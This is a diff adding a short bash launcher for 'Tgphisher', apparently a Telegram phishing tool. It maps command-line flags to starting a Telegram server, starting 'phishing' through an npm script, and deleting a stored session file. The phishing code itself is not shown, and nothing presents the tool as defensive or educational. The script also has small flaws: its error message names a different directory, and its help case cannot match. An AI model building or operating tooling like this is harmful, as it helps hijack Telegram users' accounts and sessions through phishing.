@@ -1,0 +1,36 @@
+#!/usr/bin/env bash
+
+cd /root/Tgphisher || { echo "Failed to enter the directory => /root/werbot"; exit 1; }
+
+tgphisher(){
+  case "$1 $2" in
+    "--help")
+      sudo bash help.sh 
+      ;;
+    "--start --telegram")
+      server 
+      ;;
+    "--delete session.txt")
+    rm -rf /root/Tgphisher/script/session.txt
+      ;;
+    "--start --phisher")
+      host
+      ;;
+    *)
+      echo "Erro! Unknown command: $1 $2"
+      exit 1
+      ;;
+  esac
+}
+
+server(){
+  echo "[::] Starting server..."
+  npm run telegram 
+}
+
+host(){
+  echo "[::] Starting phishing..."
+   npm run tgphisher
+}
+
+tgphisher "$@"
